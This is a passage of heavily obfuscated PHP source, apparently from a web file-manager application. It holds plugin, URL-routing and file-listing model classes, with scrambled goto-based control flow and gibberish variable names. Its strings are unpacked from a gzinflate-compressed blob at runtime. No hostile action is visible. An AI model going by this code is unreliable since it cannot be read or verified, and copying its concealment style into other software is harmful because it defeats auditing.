$B¿˜·øºš); } public function onSetConfig($AòßÂÕİ½¾) { } public function onGetConfig($AµäÓø­èÇ) { } public function onChangeStatus($Eº½„Áîƒ÷) { } public function onUninstall() { } public function onInstall() { } public function authCheck($a—„àÂ¼ = "\160\x6c\165\147\x69\156\x41\x75\x74\x68") { $f™çª»Ö =& $_SERVER[µ…]; if (!defined($f™çª»Ö[448])) { return !1; } if (_get($GLOBALS, $f™çª»Ö[479])) { return !0; } $eÄï® ã½Ğ = $this->getConfig(); if (!$eÄï® ã½Ğ[$a—„àÂ¼]) { return !1; } return ActionCall($f™çª»Ö[1438], $eÄï® ã½Ğ[$a—„àÂ¼]); } public function url($F×Š†øÏœ, $bØˆøœÓ‹Ö = '', $CÉø˜òõÉò = true) { goto EÓª°ÚñŠø; EÓª°ÚñŠø: $D„ùÔÀ¥“ =& $_SERVER[µ…]; $f³»ŒÛÎ¶ = $this->getConfig(); $D‰‰Ú÷Í¼Î = KOD_VERSION . $D„ùÔÀ¥“[94] . KOD_VERSION_BUILD; goto A˜Õˆô«×; A˜Õˆô«×: $b«öï¹‚ÎÕ = $this->packageVersion(); $EÎí¯¦Úçß = $D‰‰Ú÷Í¼Î . $D„ùÔÀ¥“[434] . $b«öï¹‚ÎÕ; if (substr($F×Š†øÏœ, 0, 4) == $D„ùÔÀ¥“[146] || substr($F×Š†øÏœ, 0, 2) == $D„ùÔÀ¥“[1221]) { $Dİ¿ÇÛ´¹– = $F×Š†øÏœ . $D„ùÔÀ¥“[1439] . $EÎí¯¦Úçß; } else { if ($bØˆøœÓ‹Ö == $D„ùÔÀ¥“[33]) { $Dİ¿ÇÛ´¹– = $this->pluginHost . $F×Š†øÏœ . $D„ùÔÀ¥“[1439] . $EÎí¯¦Úçß; } else { if ($bØˆøœÓ‹Ö === $D„ùÔÀ¥“[76]) { $Dİ¿ÇÛ´¹– = $this->pluginHost . $F×Š†øÏœ; } else { if ($bØˆøœÓ‹Ö == $D„ùÔÀ¥“[1440]) { $Dİ¿ÇÛ´¹– = STATIC_PATH . $F×Š†øÏœ . $D„ùÔÀ¥“[1439] . $D‰‰Ú÷Í¼Î; } else { if ($bØˆøœÓ‹Ö == $D„ùÔÀ¥“[1441]) { $Dİ¿ÇÛ´¹– = APP_HOST . $D„ùÔÀ¥“[1442] . $F×Š†øÏœ . $D„ùÔÀ¥“[1439] . $D‰‰Ú÷Í¼Î; } else { if (isset($f³»ŒÛÎ¶[$bØˆøœÓ‹Ö])) { $Dİ¿ÇÛ´¹– = $f³»ŒÛÎ¶[$bØˆøœÓ‹Ö] . $F×Š†øÏœ . $D„ùÔÀ¥“[1439] . $EÎí¯¦Úçß; } } } } } } goto a˜£ãìİÏ; a˜£ãìİÏ: if (!$CÉø˜òõÉò) { return $Dİ¿ÇÛ´¹–; } echo $Dİ¿ÇÛ´¹–; goto BˆíÉ›öº¶; BˆíÉ›öº¶: } public function link($fªŞ‚·ˆ£è = false, $c¨šÔÊ©¦› = '') { $e¿ŠÊ³¾äô =& $_SERVER[µ…]; if (!$fªŞ‚·ˆ£è) { $this->link($e¿ŠÊ³¾äô[1443], $e¿ŠÊ³¾äô[1441]); $this->link($e¿ŠÊ³¾äô[1444], $e¿ŠÊ³¾äô[1440]); $this->link($e¿ŠÊ³¾äô[1445], $e¿ŠÊ³¾äô[1440]); $this->link($e¿ŠÊ³¾äô[1446], $e¿ŠÊ³¾äô[1440]); $this->link($e¿ŠÊ³¾äô[1447], $e¿ŠÊ³¾äô[1440]); return; } $E¬®Ğ—Ÿå« = $this->url($fªŞ‚·ˆ£è, $c¨šÔÊ©¦›, !1); if (substr($fªŞ‚·ˆ£è, -3) == $e¿ŠÊ³¾äô[1448]) { echo $e¿ŠÊ³¾äô[1449] . $E¬®Ğ—Ÿå« . $e¿ŠÊ³¾äô[1450] . $e¿ŠÊ³¾äô[227]; } else { if (substr($fªŞ‚·ˆ£è, -4) == $e¿ŠÊ³¾äô[1451]) { echo $e¿ŠÊ³¾äô[1452] . $E¬®Ğ—Ÿå« . $e¿ŠÊ³¾äô[1453] . $e¿ŠÊ³¾äô[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\x2f\x5d\x2b", "\x3a\156\x75\155" => "\x5b\x30\55\x39\135\53", "\72\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($bÀŸöÀ«¥È, $cÕ†¡£‹·ğ) { $FôÈõ‡ =& $_SERVER[µ…]; if ($bÀŸöÀ«¥È == $FôÈõ‡[1454]) { $cŠ¥·²ÚÌ = array_map($FôÈõ‡[1455], $cÕ†¡£‹·ğ[0]); $F³é®¿ª® = strpos($cÕ†¡£‹·ğ[1], $FôÈõ‡[8]) === 0 ? $cÕ†¡£‹·ğ[1] : $FôÈõ‡[8] . $cÕ†¡£‹·ğ[1]; $B¦µÌ×÷Ñ‚ = $cÕ†¡£‹·ğ[2]; } else { $cŠ¥·²ÚÌ = null; $F³é®¿ª® = strpos($cÕ†¡£‹·ğ[0], $FôÈõ‡[8]) === 0 ? $cÕ†¡£‹·ğ[0] : $FôÈõ‡[8] . $cÕ†¡£‹·ğ[0]; $B¦µÌ×÷Ñ‚ = $cÕ†¡£‹·ğ[1]; } array_push(self::$maps, $cŠ¥·²ÚÌ); array_push(self::$routes, $F³é®¿ª®); array_push(self::$methods, strtoupper($bÀŸöÀ«¥È)); array_push(self::$callbacks, $B¦µÌ×÷Ñ‚); } public static function error($A³øŒÌñ¡ø) { self::$errorCallback = $A³øŒÌñ¡ø; } public static function haltOnMatch($f¡†˜»äÏ = true) { self::$halts = $f¡†˜»äÏ; } public static function dispatch() { goto cÀ¯‘ÕÁµ‚; cÌˆíà´Äç: self::$routes = preg_replace($f‘½éÚÚ[1139], $f‘½éÚÚ[8], self::$routes); if (in_array($dÚ˜ù‹Øì¼, self::$routes)) { $d´‘³õ‹â„ = array_keys(self::$routes, $dÚ˜ù‹Øì¼); foreach ($d´‘³õ‹â„ as $D—ËÂ“µïù) { if (self::$methods[$D—ËÂ“µïù] == $AÒ­×¼ÂŸª || self::$methods[$D—ËÂ“µïù] == $f‘½éÚÚ[1457] || in_array($AÒ­×¼ÂŸª, self::$maps[$D—ËÂ“µïù])) { $aà¼†·…§Ü = !0; if (!is_object(self::$callbacks[$D—ËÂ“µïù])) { $B¹Ü“×â½ğ = explode($f‘½éÚÚ[8], self::$callbacks[$D—ËÂ“µïù]); $D÷Æ°×å£ø = end($B¹Ü“×â½ğ); $f›§ÃÓê¿ = explode($f‘½éÚÚ[1458], $D÷Æ°×å£ø); $B‘©´İÁî‚ = new $f›§ÃÓê¿[0](); $B‘©´İÁî‚->{$f›§ÃÓê¿[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$D—ËÂ“µïù]); if (self::$halts) { return; } } } } } else { $EóÀÀ°à¤ = 0; foreach (self::$routes as $D—ËÂ“µïù) { if (strpos($D—ËÂ“µïù, $f‘½éÚÚ[4]) !== !1) { $D—ËÂ“µïù = str_replace($Eğğˆ‹µù, $aèÔÅƒ–ò, $D—ËÂ“µïù); } if (preg_match($f‘½éÚÚ[1459] . $D—ËÂ“µïù . $f‘½éÚÚ[1460], $dÚ˜ù‹Øì¼, $F¼Çé‘ùÏ£)) { if (self::$methods[$EóÀÀ°à¤] == $AÒ­×¼ÂŸª || self::$methods[$EóÀÀ°à¤] == $f‘½éÚÚ[1457] || !empty(self::$maps[$EóÀÀ°à¤]) && in_array($AÒ­×¼ÂŸª, self::$maps[$EóÀÀ°à¤])) { $aà¼†·…§Ü = !0; array_shift($F¼Çé‘ùÏ£); if (!is_object(self::$callbacks[$EóÀÀ°à¤])) { $B¹Ü“×â½ğ = explode($f‘½éÚÚ[8], self::$callbacks[$EóÀÀ°à¤]); $D÷Æ°×å£ø = end($B¹Ü“×â½ğ); $f›§ÃÓê¿ = explode($f‘½éÚÚ[1458], $D÷Æ°×å£ø); $B‘©´İÁî‚ = new $f›§ÃÓê¿[0](); if (!method_exists($B‘©´İÁî‚, $f›§ÃÓê¿[1])) { echo $f‘½éÚÚ[1461]; } else { call_user_func_array(array($B‘©´İÁî‚, $f›§ÃÓê¿[1]), $F¼Çé‘ùÏ£); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$EóÀÀ°à¤], $F¼Çé‘ùÏ£); if (self::$halts) { return; } } } } $EóÀÀ°à¤++; } } if ($aà¼†·…§Ü == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eœùØÎ‘„Â =& $_SERVER[µ…]; header($_SERVER[$eœùØÎ‘„Â[1462]] . $eœùØÎ‘„Â[1463]); echo $eœùØÎ‘„Â[1464]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$f‘½éÚÚ[1456]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto FÛ•‡…ŒšÇ; cÀ¯‘ÕÁµ‚: $f‘½éÚÚ =& $_SERVER[µ…]; $dÚ˜ù‹Øì¼ = parse_url($_SERVER[$f‘½éÚÚ[1456]], PHP_URL_PATH); $AÒ­×¼ÂŸª = $_SERVER[$f‘½éÚÚ[156]]; goto Dïˆ’â•ë÷; Dïˆ’â•ë÷: $Eğğˆ‹µù = array_keys(static::$patterns); $aèÔÅƒ–ò = array_values(static::$patterns); $aà¼†·…§Ü = !1; goto cÌˆíà´Äç; FÛ•‡…ŒšÇ: } } goto f–ïŒ‚ñ§¿; AïÔÖù‰ë¥: define($_SERVER[µ…][0], $_SERVER[µ…][1]); $_SERVER[Ïó·ƒ] = explode($_SERVER[µ…][2], gzinflate(substr($_SERVER[µ…][3], 10, -8))); function binCheckEq($fØŞ…ø¡Ó, $AÙÇÎÃ¤¶) { return $fØŞ…ø¡Ó == $AÙÇÎÃ¤¶; } goto Dß×Ò÷Âò£; f¬®–¦±¢ä: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\162\x63\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\145" => "\x69\x6f\x5f\x73\157\x75\x72\x63\145\137\155\x65\x74\x61", "\155\145\164\141\x46\x69\x65\154\x64" => "\163\157\x75\x72\x63\x65\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\151\155\145", "\x74\x69\155\145", "\151\x6e\x73\145\162\x74", "\146\x75\156\143\x74\151\157\x6e"), array("\143\x72\145\x61\x74\x65\x54\151\x6d\x65", "\164\151\155\145", "\151\156\x73\x65\162\164", "\x66\165\156\x63\x74\x69\x6f\156"), array("\166\151\x65\x77\124\151\x6d\x65", "\164\151\155\145", "\151\x6e\163\x65\162\x74", "\146\165\156\143\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($fËºßÃŞ¾) { return $this->listSource(array($_SERVER[µ…][389] => $fËºßÃŞ¾)); } public function typeName($eç¶ƒºÁ) { static $EéóñÎÔË‹ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $EéóñÎÔË‹[$eç¶ƒºÁ . $_SERVER[µ…][33]]; } public function sourceListInfo($c¦ù˜ŒÙ‚«, $E‡º„¯ÔÆÔ = false) { goto bá¸Ÿ‚²Âà; E°ÏŠ–©: if (!$c¦ù˜ŒÙ‚«) { return array(); } $B‰ÒÈâĞİê = $this->where(array($FÇ§¹²˜¶‚[390] => array($FÇ§¹²˜¶‚[7], $c¦ù˜ŒÙ‚«)))->select(); $this->_listDataApply($B‰ÒÈâĞİê, $E‡º„¯ÔÆÔ); goto A…ìğ¢ÏµÈ; A…ìğ¢ÏµÈ: return array_to_keyvalue($B‰ÒÈâĞİê, $FÇ§¹²˜¶‚[390]); goto C»š·ºÚøì; bá¸Ÿ‚²Âà: $FÇ§¹²˜¶‚ =& $_SERVER[µ…]; $c¦ù˜ŒÙ‚« = $c¦ù˜ŒÙ‚« ? $c¦ù˜ŒÙ‚« : array(); $c¦ù˜ŒÙ‚« = array_filter(array_unique($c¦ù˜ŒÙ‚«)); goto E°ÏŠ–©; C»š·ºÚøì: } public function pathInfoFilter(&$bŠôò‹ÚÁ’) { goto føÅñîââ²; cİèËñµ·: if (!$f¡Û¹ë²Õ) { goto B„ëÇ¦ƒË»; B„ëÇ¦ƒË»: $C¸ìŒ¶š‡ˆ = $b‚œ¿«‚ÊÈ[391]; $C¸ìŒ¶š‡ˆ .= $b‚œ¿«‚ÊÈ[392]; $C¸ìŒ¶š‡ˆ .= $b‚œ¿«‚ÊÈ[393]; goto cÉ¢Ğ·””´; FêˆÒ–İóß: $E§ñğÕ©© = array(); foreach ($f¡Û¹ë²Õ as $c¿Ê…Â°–¦) { if (in_array($c¿Ê…Â°–¦, $f‘Ã¬è«àŞ)) { continue; } $E§ñğÕ©©[] = $c¿Ê…Â°–¦; } goto fç·²Ééò‡; cÉ¢Ğ·””´: $eÖšä¦¹¥‡ = $b‚œ¿«‚ÊÈ[394]; $f‘Ã¬è«àŞ = explode($b‚œ¿«‚ÊÈ[47], $eÖšä¦¹¥‡); $f¡Û¹ë²Õ = explode($b‚œ¿«‚ÊÈ[47], $C¸ìŒ¶š‡ˆ); goto FêˆÒ–İóß; fç·²Ééò‡: } $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[75]] = $b‚œ¿«‚ÊÈ[395] . $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[390]] . $b‚œ¿«‚ÊÈ[396]; $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[29]] = $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[397]] == 1 ? $b‚œ¿«‚ÊÈ[76] : $b‚œ¿«‚ÊÈ[191]; goto a¿§Ô••…ã; A…·ê™: if (isset($bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[400]]) && $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[400]][$b‚œ¿«‚ÊÈ[401]] == -1) { $EÑî¢Õ‹àÊ = $E§ñğÕ©©; } $bŠôò‹ÚÁ’ = array_field_key($bŠôò‹ÚÁ’, $EÑî¢Õ‹àÊ); return $bŠôò‹ÚÁ’; goto DÉ­ô¨‡ì; a¿§Ô••…ã: $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[398]] = $this->typeName($bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[398]]); if ($bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[397]] != 1) { $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[167]] = $bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[399]]; unset($bŠôò‹ÚÁ’[$b‚œ¿«‚ÊÈ[399]]); } $EÑî¢Õ‹àÊ = $f¡Û¹ë²Õ; goto A…·ê™; føÅñîââ²: $b‚œ¿«‚ÊÈ =& $_SERVER[µ…]; static $f¡Û¹ë²Õ = false; static $E§ñğÕ©© = false; goto cİèËñµ·; DÉ­ô¨‡ì: } public function listUserFav() { goto E³…›ƒ¯„Õ; CÃğÆœ©Á: foreach ($F¼ŞÁ™–ğŞ as &$C¾¨›Ş¹Ÿ˜) { $C¾¨›Ş¹Ÿ˜ = array($E±ÎùãğÀ¹[406] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[388]], $E±ÎùãğÀ¹[407] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[28]], $E±ÎùãğÀ¹[408] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[75]], $E±ÎùãğÀ¹[409] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[29]], $E±ÎùãğÀ¹[410] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[192]], $E±ÎùãğÀ¹[411] => $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[83]]); if ($C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[29]] == $E±ÎùãğÀ¹[403] && $F§¾¤¦—Û™[$C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[75]]]) { $C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[84]] = $F§¾¤¦—Û™[$C¾¨›Ş¹Ÿ˜[$E±ÎùãğÀ¹[75]]]; } } unset($C¾¨›Ş¹Ÿ˜); return $F¼ŞÁ™–ğŞ; goto Aøê„Î×À; càõÎÇÉ–: $CÂò— èí = array_to_keyvalue($CÂò— èí, $E±ÎùãğÀ¹[33], $E±ÎùãğÀ¹[75]); if ($CÂò— èí) { $F§¾¤¦—Û™ = $this->listSource(array($E±ÎùãğÀ¹[404] => array($E±ÎùãğÀ¹[405], $CÂò— èí))); } $F§¾¤¦—Û™ = array_to_keyvalue($F§¾¤¦—Û™[$E±ÎùãğÀ¹[365]], $E±ÎùãğÀ¹[390]); goto CÃğÆœ©Á; E³…›ƒ¯„Õ: $E±ÎùãğÀ¹ =& $_SERVER[µ…]; $F¼ŞÁ™–ğŞ = Model($E±ÎùãğÀ¹[402])->listData(); $CÂò— èí = array_filter_by_field($F¼ŞÁ™–ğŞ, $E±ÎùãğÀ¹[29], $E±ÎùãğÀ¹[403]); goto càõÎÇÉ–; Aøê„Î×À: } public function listUserTag($FˆĞŒï„‰©) { goto dé‡‰¥øÔÒ; cŠÒ¹Éã: if (!$a®Í×ßˆœĞ || count($e™Ö¤ï×ğî) == $a®Í×ßˆœĞ[$B»Î—ĞæÛ[362]][$B»Î—ĞæÛ[363]]) { return $a®Í×ßˆœĞ; } $e÷¹´è®Œ© = array(); $eì§ çğ»ø = array_to_keyvalue($a®Í×ßˆœĞ[$B»Î—ĞæÛ[74]], $B»Î—ĞæÛ[33], $B»Î—ĞæÛ[390]); goto A¥£‰µ·ç; A¥£‰µ·ç: $Fš†§ê‰© = array_to_keyvalue($a®Í×ßˆœĞ[$B»Î—ĞæÛ[73]], $B»Î—ĞæÛ[33], $B»Î—ĞæÛ[390]); $d¾ÀÑ„«øÓ = array_merge($Fš†§ê‰©, $eì§ çğ»ø); foreach ($e™Ö¤ï×ğî as $Aë²ù¸´®õ) { if (!in_array($Aë²ù¸´®õ, $d¾ÀÑ„«øÓ)) { $e÷¹´è®Œ©[] = $Aë²ù¸´®õ; } } goto dçéÌ…ïà¯; aí˜ŸòñÓ„: foreach ($F‹›‘ªï as $Bœİ´ïáš => $fõ¤äÁ†ª) { $c½×âö³• = !0; if (!$FˆĞŒï„‰©) { $e™Ö¤ï×ğî[] = $Bœİ´ïáš; continue; } foreach ($FˆĞŒï„‰© as $dÚíäŒ¼) { if (!in_array($dÚíäŒ¼, $fõ¤äÁ†ª)) { $c½×âö³• = !1; break; } } if ($c½×âö³•) { $e™Ö¤ï×ğî[] = $Bœİ´ïáš; } } if (!$e™Ö¤ï×ğî) { return array(); } $a®Í×ßˆœĞ = $this->listSource(array($B»Î—ĞæÛ[404] => array($B»Î—ĞæÛ[405], $e™Ö¤ï×ğî))); goto cŠÒ¹Éã; dé‡‰¥øÔÒ: $B»Î—ĞæÛ =& $_SERVER[µ…]; if ($FˆĞŒï„‰© && !is_array($FˆĞŒï„‰©)) { $FˆĞŒï„‰© = array($FˆĞŒï„‰©); } $CçÕ“‘ĞÆ§ = Model($B»Î—ĞæÛ[412])->listData(); goto Aãñ¿Äî£Ş; dçéÌ…ïà¯: if ($e÷¹´è®Œ©) { Model($B»Î—ĞæÛ[414])->removeBySource($e÷¹´è®Œ©); } return $a®Í×ßˆœĞ; goto F˜Ë‡ìï—; Aãñ¿Äî£Ş: $F‹›‘ªï = array(); foreach ($CçÕ“‘ĞÆ§ as $d“ˆÂŸ”’) { $Aë²ù¸´®õ = $d“ˆÂŸ”’[$B»Î—ĞæÛ[75]]; if (!$Aë²ù¸´®õ) { continue; } if (!isset($F‹›‘ªï[$Aë²ù¸´®õ])) { $F‹›‘ªï[$Aë²ù¸´®õ] = array(); } $F‹›‘ªï[$Aë²ù¸´®õ][] = $d“ˆÂŸ”’[$B»Î—ĞæÛ[413]]; } $e™Ö¤ï×ğî = array(); goto aí˜ŸòñÓ„; F˜Ë‡ìï—: } public function listUserRecycle() { $C…Î·ßÙÂ‹ =& $_SERVER[µ…]; $Fƒñ¾ç·Šï = Model($C…Î·ßÙÂ‹[415])->listData(); if (!$Fƒñ¾ç·Šï) { return array(); } $E…ˆÇğ×È« = array($C…Î·ßÙÂ‹[404] => array($C…Î·ßÙÂ‹[405], $Fƒñ¾ç·Šï), $C…Î·ßÙÂ‹[416] => 1); return $this->listSource($E…ˆÇğ×È«); } public function listSource($Fùô†Ğ«Õ™, $dÓÊÅ”‚¢ = 3000) { goto c†Ñ²Ì¬Æ¡; A»²¦Á·•è: return $FÌ¸®²“¶„; goto aÏ‡•˜Ë¬Æ; c†Ñ²Ì¬Æ¡: $C£õ×ÀÚÙª =& $_SERVER[µ…]; if (!isset($Fùô†Ğ«Õ™[$C£õ×ÀÚÙª[417]])) { $Fùô†Ğ«Õ™[$C£õ×ÀÚÙª[417]] = 0; } $f’¬ôÑ£õ = $C£õ×ÀÚÙª[418]; goto b·†ä¥âÀ“; b·†ä¥âÀ“: $FÌ¸®²“¶„ = $this->field($f’¬ôÑ£õ)->_makeOrder()->where($Fùô†Ğ«Õ™)->selectPage($dÓÊÅ”‚¢); $this->_listDataApply($FÌ¸®²“¶„[$C£õ×ÀÚÙª[365]]); $this->_listMake($FÌ¸®²“¶„); goto A»²¦Á·•è; aÏ‡•˜Ë¬Æ: } protected function _makeOrder() { goto f·„·êØÏª; bôˆ‚ÛÊØŒ: if ($C±Ãñ¯ÀßÖ == $døä†Û»É§[28]) { } $FËñã®Ğ’£ = $døä†Û»É§[431] . $A¿™Š™‘Ã¬[$C±Ãñ¯ÀßÖ] . $døä†Û»É§[50] . $AÑ¤¹˜ò×[$B¾Ïæ¯’Í‡]; return $this->order(rtrim(trim($FËñã®Ğ’£), $døä†Û»É§[47])); goto D¾¯¡Ÿ’‚; a‰µ¥’İ·±: $B¾Ïæ¯’Í‡ = Input::get($døä†Û»É§[430], $døä†Û»É§[7], $bªÀšô…”, array_keys($AÑ¤¹˜ò×)); if (!in_array($C±Ãñ¯ÀßÖ, array_keys($A¿™Š™‘Ã¬))) { $C±Ãñ¯ÀßÖ = $døä†Û»É§[28]; } if (!in_array($B¾Ïæ¯’Í‡, array_keys($AÑ¤¹˜ò×))) { $C±Ãñ¯ÀßÖ = $døä†Û»É§[422]; } goto bôˆ‚ÛÊØŒ; f”œ‡‘ó…æ: $AÑ¤¹˜ò× = array($døä†Û»É§[422] => $døä†Û»É§[423], $døä†Û»É§[424] => $døä†Û»É§[425]); $A¿™Š™‘Ã¬ = array($døä†Û»É§[28] => $døä†Û»É§[28], $døä†Û»É§[77] => $døä†Û»É§[77], $døä†Û»É§[167] => $døä†Û»É§[399], $døä†Û»É§[426] => $døä†Û»É§[426], $døä†Û»É§[427] => $døä†Û»É§[428], $døä†Û»É§[192] => $døä†Û»É§[192], $døä†Û»É§[83] => $døä†Û»É§[83]); $C±Ãñ¯ÀßÖ = Input::get($døä†Û»É§[429], $døä†Û»É§[7], $EğÎŠÖÒº, array_keys($A¿™Š™‘Ã¬)); goto a‰µ¥’İ·±; f·„·êØÏª: $døä†Û»É§ =& $_SERVER[µ…]; $EğÎŠÖÒº = Model($døä†Û»É§[419])->get($døä†Û»É§[420]); $bªÀšô…” = Model($døä†Û»É§[419])->get($døä†Û»É§[421]); goto f”œ‡‘ó…æ; D¾¯¡Ÿ’‚: } protected function _listDataApplyItem($E¼øÅ¯ñè, $a¢Ã¤ºÈ‹ê = false) { $F©Œ‡Áø°ˆ = array($E¼øÅ¯ñè); $this->_listDataApply($F©Œ‡Áø°ˆ, $a¢Ã¤ºÈ‹ê); return $F©Œ‡Áø°ˆ[0]; } protected function _listDataApply(&$D–£Åõ…¸™, $EÄØ™õŞõ = false) { goto fßŠˆ¡¥¸È; a‰™Ş¾õç: $this->_listAppendPath($D–£Åõ…¸™); $this->_listAppendAuth($D–£Åõ…¸™); $this->_listAppendSourceInfo($D–£Åõ…¸™, $ağØèÔ³Şò); goto d³îËñÜ×; fßŠˆ¡¥¸È: $Aò¤ª±•¾ =& $_SERVER[µ…]; if (!$D–£Åõ…¸™) { $D–£Åõ…¸™ = array(); return; } $ağØèÔ³Şò = array_to_keyvalue($D–£Åõ…¸™, $Aò¤ª±•¾[33], $Aò¤ª±•¾[390]); goto aª†íƒ½­; aª†íƒ½­: $ağØèÔ³Şò = array_unique($ağØèÔ³Şò); $this->_listSourceCache($D–£Åõ…¸™); if (!$EÄØ™õŞõ) { $this->_listAppendMeta($D–£Åõ…¸™, $ağØèÔ³Şò); $this->_listAppendFileMeta($D–£Åõ…¸™, $ağØèÔ³Şò); $this->_listAppendChildren($D–£Åõ…¸™, $ağØèÔ³Şò); } goto a‰™Ş¾õç; d³îËñÜ×: $this->_listAppendUser($D–£Åõ…¸™); $this->_listFilterInfo($D–£Åõ…¸™, $EÄØ™õŞõ); goto D§Ø±óªÆÛ; D§Ø±óªÆÛ: } protected function _listSourceCache($c Ø˜¸Ê‚ç) { $a«Ã¸Å†ÍŞ =& $_SERVER[µ…]; foreach ($c Ø˜¸Ê‚ç as $Aëµ™ƒí²¬) { self::$cacheSourceInfo[$a«Ã¸Å†ÍŞ[432] . $Aëµ™ƒí²¬[$a«Ã¸Å†ÍŞ[390]]] = $Aëµ™ƒí²¬; } } protected function _listFilterInfo(&$f•õ»œÖ, $E¡ñ­î = false) { $C³¡›éŒÛ‘ =& $_SERVER[µ…]; foreach ($f•õ»œÖ as &$bî–ˆÚ¹½Ğ) { $bî–ˆÚ¹½Ğ = $this->pathInfoFilter($bî–ˆÚ¹½Ğ); self::$cachePathInfo[$C³¡›éŒÛ‘[433] . intval($E¡ñ­î) . $C³¡›éŒÛ‘[434] . $bî–ˆÚ¹½Ğ[$C³¡›éŒÛ‘[390]]] = $bî–ˆÚ¹½Ğ; } unset($bî–ˆÚ¹½Ğ); } protected function _listMake(&$E•à™¬°Õğ) { $Aƒ•Ù¤Ç¬¥ =& $_SERVER[µ…]; $E•à™¬°Õğ[$Aƒ•Ù¤Ç¬¥[74]] = array(); $E•à™¬°Õğ[$Aƒ•Ù¤Ç¬¥[73]] = array(); foreach ($E•à™¬°Õğ[$Aƒ•Ù¤Ç¬¥[365]] as $DŒ„œïĞâº) { $AâÓ±Û— = $DŒ„œïĞâº[$Aƒ•Ù¤Ç¬¥[397]] == 1 ? $Aƒ•Ù¤Ç¬¥[74] : $Aƒ•Ù¤Ç¬¥[73]; $E•à™¬°Õğ[$AâÓ±Û—][] = $DŒ„œïĞâº; } unset($E•à™¬°Õğ[$Aƒ•Ù¤Ç¬¥[365]]); } protected function _listAppendMeta(&$bñ……Äªé‡, $e­áÉÖá¾¨) { goto cÖÜ’êØ«; Cª“‘„¿æß: if (!$E²÷ñæè¥’) { return; } $bÌ˜¹ÄóÅŸ = array($Aù»ö½ œ[437], $Aù»ö½ œ[438]); $dœ±‚³Š‡ = array(); goto AÀğŸ§±; AÀğŸ§±: foreach ($E²÷ñæè¥’ as $DÚ…×ñ›´×) { if (!isset($dœ±‚³Š‡[$DÚ…×ñ›´×[$Aù»ö½ œ[390]]])) { $dœ±‚³Š‡[$DÚ…×ñ›´×[$Aù»ö½ œ[390]]] = array(); } if (in_array($DÚ…×ñ›´×[$Aù»ö½ œ[92]], $bÌ˜¹ÄóÅŸ)) { continue; } $dœ±‚³Š‡[$DÚ…×ñ›´×[$Aù»ö½ œ[390]]][$DÚ…×ñ›´×[$Aù»ö½ œ[92]]] = $DÚ…×ñ›´×[$Aù»ö½ œ[370]]; } foreach ($bñ……Äªé‡ as &$cïàùˆë¬) { $cïàùˆë¬[$Aù»ö½ œ[439]] = !1; if (isset($dœ±‚³Š‡[$cïàùˆë¬[$Aù»ö½ œ[390]]])) { $cïàùˆë¬[$Aù»ö½ œ[439]] = $dœ±‚³Š‡[$cïàùˆë¬[$Aù»ö½ œ[390]]]; } if ($this->fileIsLock($cïàùˆë¬) && $cïàùˆë¬[$Aù»ö½ œ[400]]) { $CÎÒİ‘Œ¨É = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cïàùˆë¬[$Aù»ö½ œ[400]][$Aù»ö½ œ[401]] = AuthModel::authDisable($cïàùˆë¬[$Aù»ö½ œ[400]][$Aù»ö½ œ[401]], $CÎÒİ‘Œ¨É); $cïàùˆë¬[$Aù»ö½ œ[400]][$Aù»ö½ œ[440]][$Aù»ö½ œ[400]] = $cïàùˆë¬[$Aù»ö½ œ[400]][$Aù»ö½ œ[401]]; } } unset($cïàùˆë¬); goto FæÖ‰óÊà; cÖÜ’êØ«: $Aù»ö½ œ =& $_SERVER[µ…]; $dÊ›¬¾Œø = array($Aù»ö½ œ[404] => array($Aù»ö½ œ[405], $e­áÉÖá¾¨)); $E²÷ñæè¥’ = Model($Aù»ö½ œ[435])->field($Aù»ö½ œ[436])->where($dÊ›¬¾Œø)->select(); goto Cª“‘„¿æß; FæÖ‰óÊà: } protected function _listAppendFileMeta(&$A—Ïà“˜Õ¥, $dÅÇ™Ÿ¼ë) { goto A‡Œ½µ¢‘è; DµäĞŞÈëÙ: foreach ($A—Ïà“˜Õ¥ as &$BˆŠøœéêš) { goto eĞàÖ¥Öº°; dóƒÇ‰ƒ‹Õ: 